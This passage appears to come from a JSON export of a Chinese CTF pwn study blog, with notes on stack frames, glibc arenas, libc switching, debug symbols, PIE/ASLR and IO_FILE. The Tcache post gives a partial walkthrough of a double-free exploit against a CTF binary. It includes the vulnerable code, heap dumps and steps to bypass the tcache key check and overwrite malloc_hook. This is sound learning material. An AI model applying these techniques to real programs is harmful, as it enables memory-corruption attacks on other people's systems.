esi,3mov eax,arrayD[esi*4] ;eax = 4 其中，比例因子“4”代表数组的元素个数，esi的值代表下标。 2）段寄存器其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h 3）基础指令1/数据传输mov为了实现各种数据的传输，mov还有一下几种派生指令 movzx对目的操作数进行全0拓展并且复制。 movsx同上，但是是用1拓展而不是0。 与数据传输相关的指令还有很多，以后待补充。 2/与数据相关的运算符和伪指令offset返回一个偏移量 align将一个变量对齐到边界。 ps：对于cpu来说，处理偶地址速度会快于奇地址。 ptr重写一个已经被声明过操作数的大小类型。 type返回变量单个元素的大小 lengthof计算数组中元素的个数 sizeof返回lengthof和type的乘积 函数调用栈从一个简单的程序入手。 程序来自你邮萌新赛pwn1-人类补习计划。 ​ 可以看到对栈空间进行一个初始化的操作的三行关键代码。 123push rbpmov rbp, rspsub rsp, 30h 然后就是人神共愤的函数调用栈环节。 rbp ： 栈基址指针寄存器 。 rsp ： 栈顶指针寄存器。 ​ 之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。 ​ 并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。 ​ 值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。 ​ ebp也就是s的位置，很显然在esp之下。 ​ 然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。 主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。 这段话说得非常玄学，而csapp中说得就非常简单清晰 当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压人栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。 ​ 还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。 ​ 那么直接从动态调试的角度来研究函数调用栈。 ​ 关于压栈的一些传参方式，可以参见格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。 当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。 此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。 可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。 tbc","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"pwn Primary","slug":"pwn-Primary","permalink":"https://fuurinko.github.io/tags/pwn-Primary/"}]},{"title":"main_arana 与多线程","slug":"main_arana 与多线程","date":"2021-08-18T09:24:05.282Z","updated":"2022-03-20T04:31:47.591Z","comments":true,"path":"2021/08/18/main_arana 与多线程/","link":"","permalink":"https://fuurinko.github.io/2021/08/18/main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下： Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。 首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。 所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。 加锁当多个线程同时操作同一个共享全局变量的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。 线程线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。 比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。 其中会有一个main_arena,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。 这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。 在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。 之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。 但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是main_arena而并不是什么non_main_arena。并且只有main_arena 能够访问heap段，non_main_arena只能访问mmap映射区域。 总结用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。 参考malloc x 线程 GLibcHeap","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"Tcahce学习","slug":"Tcache学习","date":"2021-08-17T02:53:00.000Z","updated":"2022-03-20T04:33:03.589Z","comments":true,"path":"2021/08/17/Tcache学习/","link":"","permalink":"https://fuurinko.github.io/2021/08/17/Tcache%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Tcahce学习0）review说是Tcache学习，实际上是lonelywolf的复现。 网上wp都是神仙写的，一点也不萌新友好。我都看不懂（） 打开题发现这个菜单题好常规。 但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。 具体的参考可以看glibc2.31下的新double free手法/字节跳动pwn题gun题解。但是在这道题里面充其量算一个trick而不是核心考点。 1）漏洞点123456789101112unsigned __int64 delete()&#123; __int64 v1; // [rsp+0h] [rbp-18h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); __printf_chk(1LL, &quot;Index: &quot;); __isoc99_scanf(&amp;number, &amp;v1); if ( !v1 &amp;&amp; buf ) free(buf); return __readfsqword(0x28u) ^ v2;&#125; 漏洞点。经典uaf。 之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。 123456789while ( 1 ) &#123; read(0, v0, 1uLL); if ( *v0 == &#x27;\\n&#x27; ) break; if ( ++v0 == v1 ) return __readfsqword(0x28u) ^ v4; &#125; *v0 = 0; 然后有一个比较怪的点就是这里的 __readfsqword();。很明显他是一个和读取有关的函数，但是ida根本点不进去。 后面我才知道这个函数是和canary保护有关。 根据微软官方文档…这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。 但是好像说了和没说一样。 回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。Canary安全机制原理实战分析 ![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png) 2）漏洞利用1）Tcache double free之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。 虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。 1234add(0,0x68)free(0)gdb.attach(p)pause() 首先先分配再释放一下，看看这个题具体的内存分布有什么特点。 1234567891011121314151617181920212223242526272829303132pwndbg&gt; heaAllocated chunk | PREV_INUSEAddr: 0x55e9c994c000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x55e9c994c250Size: 0x71fd: 0x00Top chunk | PREV_INUSEAddr: 0x55e9c994c2c0Size: 0x20d41pwndbg&gt; bintcachebins0x70 [ 1]: 0x55e9c994c260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty 之前一直不是很清楚 123Allocated chunk | PREV_INUSEAddr: 0x55e9c994c000Size: 0x251 这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。 然后这边 10x70 [ 1]: 0x55e9c994c260 ◂— 0x0 //说明0x70大小的Tcache里只有一个Tcache chunk， 12345678910pwndbg&gt; x/300gx 0x562fcfd390000x562fcfd39000: 0x0000000000000000 0x00000000000002510x562fcfd39010: 0x0000010000000000 0x00000000000000000x562fcfd39020: 0x0000000000000000 0x00000000000000000x562fcfd39030: 0x0000000000000000 0x00000000000000000x562fcfd39040: 0x0000000000000000 0x00000000000000000x562fcfd39050: 0x0000000000000000 0x00000000000000000x562fcfd39060: 0x0000000000000000 0x00000000000000000x562fcfd39070: 0x0000000000000000 0x0000562fcfd39260 这是控制堆块的部分结构 0x562fcfd39010: 0x0000010000000000 0x0000000000000000中，1说明只有一个Tcache。 T擦车堆块的首地址也记录在内。从0x562fcfd39050开始分别记录0x20到0x70的Tcache chunk的首地址，比如0x562fcfd39070: 0x0000000000000000 0x0000562fcfd39260,记录的就是0x70大小chunk的首地址。 喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。 123pwndbg&gt; x/20gx 0x56533012f2500x56533012f250: 0x0000000000000000 0x00000000000000710x56533012f260: 0x0000000000000000 0x000056533012f010 我们到Tcache的地址中看一看，会发现0x56533012f260: 0x0000000000000000 0x000056533012f010处的0x000056533012f010，这是一个key值。 2.29下Tcahce double free的检测之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是 对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry) 123456typedef struct tcache_entry&#123; struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段&#125; tcache_entry; 也就是所谓的key对应的就是chunk的bk字段。 当chunk被free，放入Tcache链表时，操作如下。 123456789101112131415 static __always_inline voidtcache_put(mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *)chunk2mem(chunk); /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will detect a double free. */ e-&gt;key = tcache; //设置所属的tcache e-&gt;next = tcache-&gt;entries[tc_idx];//单链表头插法 tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]); //计数增加&#125; 然后进行free操作 123456789101112131415161718192021222324252627size_t tc_idx = csize2tidx(size);//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123; /* Check to see if it&#x27;s already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来 如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free */ if (__glibc_unlikely(e-&gt;key == tcache))//剪枝 &#123; tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&quot;free(): double free detected in tcache 2&quot;); &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 &#123; tcache_put(p, tc_idx); return; &#125;&#125; 源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。 大致是 12345add(0,0x78)free(0)edit(0,b&quot;aaaa&quot;)free(0)show(0) 再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。 然后我们需要构造出unsortedbin chunk、 但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。 那么有什么办法能构造出unsortedbin呢？回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？ 如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？ 然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。 总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。 然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。 调试接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。 但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。 Tcache 利用不是学习不是学习不是学习， 例题是lctf2018的easyheap。 漏洞点一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。 然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。 12345678910111213141516171819202122232425unsigned __int64 __fastcall sub_BEC(_BYTE *a1, int a2)&#123; signed int v3; // [rsp+14h] [rbp-Ch] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); v3 = 0; if ( a2 ) &#123; while ( 1 ) &#123; read(0, &amp;a1[v3], 1uLL); if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] == 10 ) break; ++v3; &#125; a1[v3] = 0; a1[a2] = 0;//loophole &#125; else &#123; *a1 = 0; &#125; return __readfsqword(0x28u) ^ v4;&#125; 然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。 在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。 包括ciscn lonelywolf也是利用到了这一点。 参考2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分 glibc2.31下的新double free手法/字节跳动pwn题gun题解 CISCN2021 lonelywolf","categories":[{"name":"HEAP - Tcache","slug":"HEAP-Tcache","permalink":"https://fuurinko.github.io/categories/HEAP-Tcache/"}],"tags":[{"name":"Heap","slug":"Heap","permalink":"https://fuurinko.github.io/tags/Heap/"}]},{"title":"ubuntu加载不同版本libc","slug":"ubuntu加载不同版本libc","date":"2021-08-17T02:53:00.000Z","updated":"2022-03-20T04:33:11.439Z","comments":true,"path":"2021/08/17/ubuntu加载不同版本libc/","link":"","permalink":"https://fuurinko.github.io/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/","excerpt":"","text":"1）review 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。 然后我就是这样一步一步地变得不会调试的。 但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。 呜呜呜，我居然一直忽略了它的灵魂 所以这一次我一定要解决掉这个问题。 之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。 目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。 2）原理在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。 但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。 1）LD_PRELOAD首先就是我们在脚本前加载的LD_PRELOAD这个东西。一般的用法是env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125; 它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。 这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 换句话说我们可以通过指定这个环境变量来指定特定的libc版本。 2）LD_LIBRARY_PATH和LIBRARY_PATHLD_LIBRARY_PATH用于在程序加载运行期间查找动态链接库时指定除了系统默认路径之外的其他路径. LIBRARY_PATH环境变量用于在程序编译期间查找动态链接库时指定查找共享库的路径 其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。 并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以LD_PRELOAD还是比较常见。 相关（？）环境变量大概就这么多，然后是某些特殊的段。 1） PT_INTERP储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。 我们可以修改这个段的内容来指定我们需要的链接器。 汇总综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。 准备好了以后我们通过脚本将题目PT_INTERP段修改，然后通过LD_PRELOAD指定我们需要的libc的路径即可。 实际操作我们以lonelywolf为例。 有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。 参考LD_PRELOAD的偷梁换柱之能","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"}]},{"title":"记一次ubuntu18.04的glibc调教","slug":"记一次ubuntu18.04的glibc调教","date":"2021-08-16T13:24:18.623Z","updated":"2022-03-20T04:30:43.268Z","comments":true,"path":"2021/08/16/记一次ubuntu18.04的glibc调教/","link":"","permalink":"https://fuurinko.github.io/2021/08/16/%E8%AE%B0%E4%B8%80%E6%AC%A1ubuntu18.04%E7%9A%84glibc%E8%B0%83%E6%95%99/","excerpt":"","text":"1）概述这是一件悲伤的事情，我的ubuntu它又崩了。 最开始的时候，发现pwndbg无法查看heap等信息，这个问题我之前也遇到过，但是情况有非常大的区别。 之前是我2.32的本地默认libc，执行程序时加载2.23，然后因为指定的lbc-2.23.so没有附带调试符号信息，所以也看不了heap，但是这一次，本机都看不了了？ 经过一番排查，我们认为是libc本身出现了问题。然后寻找libc-2.27.so的文件打算一探究竟，但找到本应该储存着它的文件夹时，惊奇地发现它居然从文件夹中消失了。 它并不是无缘无故消失的，我大致分析了一下原因。之前我做题时试图切换libc版本，然后在镜像站下载了（应该）带调试符号的libc-2.27.so。但是并不是很清楚，所以喊来了pwn爷爷，pwn爷爷并不熟悉我的电脑，一通操作猛如虎，干了啥我也不知道，反正好像是把libc丢进了根目录。 可能就是在那会儿，新下载的libc和已有的libc产生了冲突，然后启动了什么奇怪的过程，把libc彻底搞崩了。 但是这个pwn大哥完全没锅，因为挺有趣的其实。 然后大致明了的问题的方向我开始寻找解决方案。 虽然pwn大哥不费吹灰之力帮我重新装了一个系统并且完善好了环境，但是还有一个报废的系统等着我蹂躏呢（） 2)record记录一下所有调教的操作。 普通地在/usr/lib/x86_64-linux-gnu文件夹中添加ld，无效。 普通地在/usr/lib/x86_64-linux-gnu文件夹中添加带有调试符号的libc，无效。 等等为什么ld和libc都没了。。 12345pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from ./worldline...done.Attaching to program: /home/fur1n/pwn/heap/merely_game/wordline/worldline, process 12250Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...warning: the debug information found in &quot;/usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so&quot; does not match &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; (CRC mismatch) 好嘛。 About CRC ErrorsA CRC error indicates that some data in your Zip file (.zip or .zipx) is damaged. CRC stands for cyclic redundancy check. It is a calculation made from all the data in a file to insure accuracy. When you add a file to a Zip file, WinZip calculates a CRC value for the file and saves the value in the Zip file. When you later extract the file from the Zip file, WinZip calculates the CRC of the extracted file and compares it to the value stored when the file was zipped. If these two CRC values do not match, the file that was extracted does not match the original file, and WinZip will display a CRC Error message. When the data in a Zip file is damaged, it may not be possible to extract all of the files from the Zip file correctly. Damaged data can affect the entire Zip file, multiple files, or just one file. crc的官方定义是文件被损坏导致错误，但是实际并没有损坏。。感觉并不是可以随便解决的问题 ​ 3.替换libc.so.6文件。他不是不匹配嘛，不匹配我就弄个匹配的。结果无效。 查了一下，查出一堆奇怪的问题。网上大多都是完全无法调试，但是我这就很离谱。 难道只能硬啃那个又臭又长的gdb的文档吗？ 18.3 Debugging Information in Separate Files GDB supports two ways of specifying the separate debug info file: The executable contains a debug link that specifies the name of the separate debug info file. The separate debug file’s name is usually executable.debug, where executable is the name of the corresponding executable file without leading directories (e.g., ls.debug for /usr/bin/ls). In addition, the debug link specifies a 32-bit Cyclic Redundancy Check (CRC) checksum for the debug file, which GDB uses to validate that the executable and the debug file came from the same build. The executable contains a build ID, a unique bit string that is also present in the corresponding debug info file. (This is supported only on some operating systems, when using the ELF or PE file formats for binary files and the GNU Binutils.) For more details about this feature, see the description of the –build-id command-line option in Command Line Options in The GNU Linker. The debug info file’s name is not specified explicitly by the build ID, but can be computed from the build ID, see below. 在某些系统中（比如我们的ubunut），由于调试文件可能比可执行程序都大，所以通常将可执行文件以及调试文件分开存放。一般来说调试信息 的后缀是.debug。 gdb支持两种寻找调试info文件的方式。 一种是可执行文件包含指向调试信息文件的路径。就比如ls在 /usr/bin/ls)中，同时这个文件夹还包含ls.debug文件。 然后调试链接器还通过crc检查来使来源于同一个编译的可执行文件和调试文件生效。 此外还有就是通过匹配build ID来指定。关于build ID，这个确实是有的。 然后当可执行文件已经指定好调试文件，gdb还需要去寻找它。就像小张跟小静说我要找小王，小静只是知道他需要找到小王，但是还不知道怎么找。 Depending on the way the debug info file is specified, GDB uses two different methods of looking for the debug file: For the “debug link” method, GDB looks up the named file in the directory of the executable file, then in a subdirectory of that directory named .debug, and finally under each one of the global debug directories, in a subdirectory whose name is identical to the leading directories of the executable’s absolute file name. (On MS-Windows/MS-DOS, the drive letter of the executable’s leading directories is converted to a one-letter subdirectory, i.e. d:/usr/bin/ is converted to /d/usr/bin/, because Windows filesystems disallow colons in file names.) For the “build ID” method, GDB looks in the .build-id subdirectory of each one of the global debug directories for a file named nn/nnnnnnnn.debug, where nn are the first 2 hex characters of the build ID bit string, and nnnnnnnn are the rest of the bit string. (Real build ID strings are 32 or more hex characters, not 10.) So, for example, suppose you ask GDB to debug /usr/bin/ls, which has a debug link that specifies the file ls.debug, and a build ID whose value in hex is abcdef1234. If the list of the global debug directories includes /usr/lib/debug, then GDB will look for the following debug information files, in the indicated order: - /usr/lib/debug/.build-id/ab/cdef1234.debug - /usr/bin/ls.debug - /usr/bin/.debug/ls.debug - /usr/lib/debug/usr/bin/ls.debug. 一个就是普通的在子目录中寻找对应的文件， 另外一个根据build ID，在名为.build-id的子目录中寻找build ID对应的文件夹。 也就是说如果要调试 /usr/bin/ls 1234/usr/lib/debug/.build-id/ab/cdef1234.debug/usr/bin/ls.debug/usr/bin/.debug/ls.debug/usr/lib/debug/usr/bin/ls.debug. 这四种路径都能帮助gdb找到对应的调试文件。 所以无论如何实际上没有解决任何问题。比如我找到的在stackoverflow上的相同报错，基本上都是在对应文件夹中缺少他编译文件的.debug文件，但是这个和我感觉咩有关系。因为感觉libc这种本来就是咩有debug文件的。。。。 网上也一会儿找不到和我相同的情况。好离谱 我只能暂且顺着这个思路走一走，看看能不能添加什么libc-2.27.so的debug文件。但是好奇怪，就算缺少也应该是我们需要调试的程序缺少调试文件，为什么是libc缺少调试文件，难道我们调的不是程序而是libc？ 就跟之前我看那个源码级调试堆题，給的源码也是malloc的源码。 对了，18.04的应该是把debug信息一起整合到了一个叫debug的文件夹里/usr/lib/debug 里面感觉和libc如出一撤，所以我才猜测这就是对应的所谓的调试信息。 然后检查发现都比较完善，没有缺少什么。 这就很怪了。 想一下，之前报错就是说libc.so.6和libc的调试文件不匹配 12warning: the debug information found in &quot;/usr/lib/debug//lib/x86_64-linux-gnu/ld-2.27.so&quot; does not match &quot;/lib64/ld-linux-x86-64.so.2&quot; (CRC mismatch).warning: the debug information found in &quot;/usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so&quot; does not match &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; (CRC mismatch). /lib64/ld-linux-x86-64.so.2是一个软连接，在这里链接的是/lib/x86_64-linux-gnu/ld-2.27.so,也就相当于ld-2.27.so","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"ELF文件下对于PIE保护和ASLR的重新认识","slug":"ELF文件下对于PIE保护和ASLR的重新认识","date":"2021-08-13T07:06:00.000Z","updated":"2022-03-20T04:31:26.223Z","comments":true,"path":"2021/08/13/ELF文件下对于PIE保护和ASLR的重新认识/","link":"","permalink":"https://fuurinko.github.io/2021/08/13/ELF%E6%96%87%E4%BB%B6%E4%B8%8B%E5%AF%B9%E4%BA%8EPIE%E4%BF%9D%E6%8A%A4%E5%92%8CASLR%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/","excerpt":"","text":"ELF文件下对于PIE保护和ASLR的重新认识0）​ 复现红色高跟鞋的时候，在ida修复swithc结构的时候碰见了一个问题。因为题目的源文件是有pie保护的，所以ida中的地址是很难看的随机化模式。虽然这些随机化的地址对于我们patch文件毫无影响，但是就是突发奇想，看看能不能找到方法来通过patch将elf文件的pie保护给禁用。 1）​ 如果用010editor打开一个PE文件，我们能够很方便的通过修改PE头来禁用掉Windows程序的ASLR保护。这是因为程序本身其实并不是位置无关的。 ASLR在PE文件上的开启与否实际上就是PE头上标识符的区分，总的来说ASLR是操作系统的功能，而不是程序本身的特性，以ASLR ON 编译，也只是给程序加上了能被ASLR保护识别的标识符。所以我们只需要patch掉这个标识符，就能够改变程序的地址随机化状态。 也正是在寻找方法的过程中，我逐渐认识到虽然PIE保护和ASLR表现形式都是地址随机化，但是两者的原理以及实现的方式并不一样，甚至大相径庭。 在维基百科上，我们能够清楚地看到PIE的全称是Position-independence Executable，位置无关可执行文件。 这个概念并不是很常见，相对更为常见的是PIC，Position-independence Code，位置无关代码。 PIC和PIE只差了一个字母，意思也相近。但PIC更多的是在重定位中被提及。源码通过汇编器生成可重定位目标文件，此时它的代码就是位置无关，从0开始的，PIE和PIC的概念相近，当编译完成，可执行文件的便是位置无关了，我们无法改变这一点，也就是说，被PIE保护的文件，并不是通过给头文件加上标识符，使系统开启或关闭随机，而是文件本身便是位置无关吗，是随机的。 ​ 然而，虽然文件本身是位置无关的，但是实际地址是否随机，还是要看进程中aslr是否开启，如果将进程aslr关闭，那么调试时我们看到的地址依旧不是随机的。这里主要涉及到重定位的相关知识，之后会写一篇笔记来试图深入系统重定位过程与地址随机化之间的关系。","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"IO_FILE学习","slug":"io_file（未完成）","date":"2021-08-09T07:44:00.000Z","updated":"2022-03-20T04:31:41.790Z","comments":true,"path":"2021/08/09/io_file（未完成）/","link":"","permalink":"https://fuurinko.github.io/2021/08/09/io_file%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89/","excerpt":"","text":"io_file学习笔记 0）reviewglibc定义了_IO_FILE这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的_IO_FILE_plus结构 结构源码如下 12345struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; 这个结构包含了一个叫vtable的指针，指向实现io函数各种功能的真正函数。 以fread为例子简述io_file结构调用的流程 freadfread真正功能的实现在子函数_IO_sgetn中。 下面是_IO_sgetn的源码。 12345678_IO_size_t_IO_sgetn (fp, data, n) _IO_FILE *fp; void *data; _IO_size_t n;&#123; return _IO_XSGETN (fp, data, n);&#125; 实际上也是先定义一堆变量然后内部再调用另外一个函数。 